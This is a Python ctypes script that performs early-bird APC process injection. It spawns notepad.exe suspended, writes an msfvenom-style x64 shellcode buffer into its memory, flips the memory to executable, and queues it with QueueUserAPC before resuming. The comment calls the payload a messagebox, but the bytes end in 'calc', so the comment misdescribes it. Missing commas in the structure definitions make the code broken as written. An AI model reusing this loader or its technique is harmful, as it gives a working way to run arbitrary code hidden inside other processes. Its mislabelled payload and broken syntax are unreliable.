from ctypes import *
from ctypes import wintypes
import subprocess

kernel32 = windll.kernel32
SIZE_T = c_size_t
LPSTR = POINTER(c_char)
LPBYTE = POINTER(c_ubyte)

VirtualAllocEx = kernel32.VirtualAllocEx
VirtualAllocEx.argtypes = (wintypes.HANDLE, wintypes.LPVOID, SIZE_T, wintypes.DWORD, wintypes.DWORD)
VirtualAllocEx.restype = wintypes.LPVOID

WriteProcessMemory = kernel32.WriteProcessMemory
WriteProcessMemory.argtypes = (wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, SIZE_T, POINTER(SIZE_T))
WriteProcessMemory.restype = wintypes.BOOL

class _SECURITY_ATTRIBUTES(Structure):
    _fields_ = [('nLength', wintypes.DWORD),
                ('lpSecurityDescriptor', wintypes.LPVOID),
                ('bInheritHandle', wintypes.BOOL),]
    
SECURITY_ATTRIBUTES = _SECURITY_ATTRIBUTES
LPSECUTIYR_ATTRIBUTES = POINTER(_SECURITY_ATTRIBUTES)
LPTHREAD_START_ROUTINE = wintypes.LPVOID

CreateRemoteThread = kernel32.CreateRemoteThread
CreateRemoteThread.argtypes = (wintypes.HANDLE, LPSECUTIYR_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, wintypes.LPVOID, wintypes.DWORD, wintypes.LPDWORD)
CreateRemoteThread.restype = wintypes.HANDLE

MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_READWRITE = 0x04
EXECUTE_IMMEDIATELY =0x0
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0x00000FFF)

VirtualProtectEx = kernel32.VirtualProtectEx
VirtualProtectEx.argtypes = (wintypes.HANDLE, wintypes.LPVOID, SIZE_T, wintypes.DWORD, wintypes.LPDWORD)
VirtualProtectEx.restype = wintypes.BOOL

#process = subprocess.Popen(["notepad.exe"])
#print("Starting process with PID -> {}".format(process.pid))

class STARTUPINFO(Structure):
    _fields_ = [("cb", wintypes.DWORD)
                ("lpReserved", LPSTR)
                ("lpDesktop", LPSTR)
                ("lpTitle", LPSTR)
                ("dwX", wintypes.DWORD)
                ("dwY", wintypes.DWORD)
                ("dwXSize", wintypes.DWORD)
                ("dwYSize", wintypes.DWORD)
                ("dwXCountChars", wintypes.DWORD)
                ("dwYCountChars", wintypes.DWORD)
                ("dwFillAttributes", wintypes.DWORD)
                ("dwFlags", wintypes.DWORD)
                ("wShowWindow", wintypes.WORD)
                ("cbReserved2", wintypes.WORD)
                ("lpReserved2", LPBYTE)
                ("hstdInput", wintypes.HANDLE)
                ("hstdOutput", wintypes.HANDLE)
                ("hstdError", wintypes.HANDLE)]

class PROCESS_INFORMATION(Structure):
    _fields_ = [("hProcess", wintypes.HANDLE)
                ("hThread", wintypes.HANDLE)
                ("dwProcessId", wintypes.DWORD)
                ("dwThreadId", wintypes.DWORD)]

CreateProcessA = kernel32.CreateProcessA
CreateProcessA.argtypes = (wintypes.LPCSTR, wintypes.LPSTR, LPSECUTIYR_ATTRIBUTES, LPSECUTIYR_ATTRIBUTES, wintypes.BOOL, wintypes.DWORD, wintypes.LPVOID, wintypes.LPCSTR, POINTER(STARTUPINFO), POINTER(PROCESS_INFORMATION))
CreateProcessA.restype = wintypes.BOOL

# msfvenom -a x64 -p windows/x64/messagebox TITLE=hello TEXT=world -f py
# THIS CMD WILL CREATE A SHELL CODE 

# BELOW WRITTEN BUF IS A SHELLCODE FOR HELLO WORLD!
buf =  b""      
buf += b"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
buf += b"\x52\x48\x31\xd2\x56\x65\x48\x8b\x52\x60\x48\x8b\x52\x18"
buf += b"\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d"
buf += b"\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1"
buf += b"\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20"
buf += b"\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f\x85"
buf += b"\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74"
buf += b"\x67\x48\x01\xd0\x50\x44\x8b\x40\x20\x49\x01\xd0\x8b\x48"
buf += b"\x18\xe3\x56\x4d\x31\xc9\x48\xff\xc9\x41\x8b\x34\x88\x48"
buf += b"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
buf += b"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
buf += b"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
buf += b"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
buf += b"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
buf += b"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
buf += b"\x12\xe9\x4b\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
buf += b"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
buf += b"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
buf += b"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
buf += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
buf += b"\xd5\x63\x61\x6c\x63\x00"

def verify(x):
    if not x:
        raise WinError()
startupinfo = STARTUPINFO()
startupinfo.cb = sizeof(STARTUPINFO)

startupinfo.dwFlags = 1
startupinfo.wShowWindow = 1

processinfo = PROCESS_INFORMATION()

CREATE_NEW_CONSOLE = 0x00000010
CREATE_NO_WINDOW = 0x08000000
CREATE_SUSPENDED = 0x00000004

created = CreateProcessA(b"C:\\Windows\\System32\\notepad.exe", None, None, None, False, CREATE_SUSPENDED | CREATE_NO_WINDOW, None, None, byref(startupinfo), byref(processinfo))

verify(created)

pid = processinfo.dwProcessId
h_process = processinfo.hProcess
thread_id = processinfo.dwThreadId
h_thread = processinfo.hThread

print("Started Process => Hnadle:{}, PID:{}, TID:{}".format(h_process, pid, thread_id))

remote_memory = VirtualAllocEx(h_process, False, len(buf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
verify(remote_memory)
print("Memory Allocated => ", hex(remote_memory))

write = WriteProcessMemory(h_process, remote_memory, buf, len(buf), None)
verify(write)
print("Bytes Written => {}".format(len(buf)))

PAGE_EXECUTE_READ = 0x20
old_proctection = wintypes.DWORD(0)

protect = VirtualProtectEx(h_process, remote_memory, len(buf), PAGE_EXECUTE_READ, byref(old_proctection))
verify(protect)
print("Memory Proctection updated from {} to {}".format(old_proctection.value, PAGE_EXECUTE_READ))

#rthread = CreateRemoteThread(h_process, None, 0, remote_memory, None, EXECUTE_IMMEDIATELY, None)
#verify(rthread)

PAPCFUNC = CFUNCTYPE(None, POINTER(wintypes.ULONG))

QueueUserAPC = kernel32.QueueUserAPC
QueueUserAPC.argtypes = (PAPCFUNC, wintypes.HANDLE, POINTER(wintypes.ULONG))
QueueUserAPC.restype = wintypes.BOOL

ResumeThread = kernel32.ResumeThread
ResumeThread.argtypes = (wintypes.HANDLE, )
ResumeThread.restype = wintypes.BOOL

rqueue = QueueUserAPC(PAPCFUNC(remote_memory), h_thread, None)
verify(rqueue)
print("Queue APC Thread -> {}".format(h_thread))

# TO RESUME THE PROCESS (DISABLE SUSPENDED MODE)

rthread = ResumeThread(h_thread)
verify(rthread)
print(" Resuming thread !!!")

